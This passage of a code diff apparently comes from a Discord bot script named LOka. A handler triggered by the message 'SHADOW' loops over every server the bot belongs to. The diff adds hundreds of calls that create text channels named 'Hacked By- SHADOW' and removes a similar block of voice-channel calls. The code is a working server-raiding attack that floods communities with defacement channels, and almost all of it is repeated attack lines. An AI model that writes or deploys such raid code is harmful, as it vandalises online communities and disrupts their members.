+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
 
 
 
@@ -558,496 +2421,357 @@ m.createChannel('Hacked By- ????', 'text');
 LOka.on('message', message => {
          if (message.content === "SHADOW") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
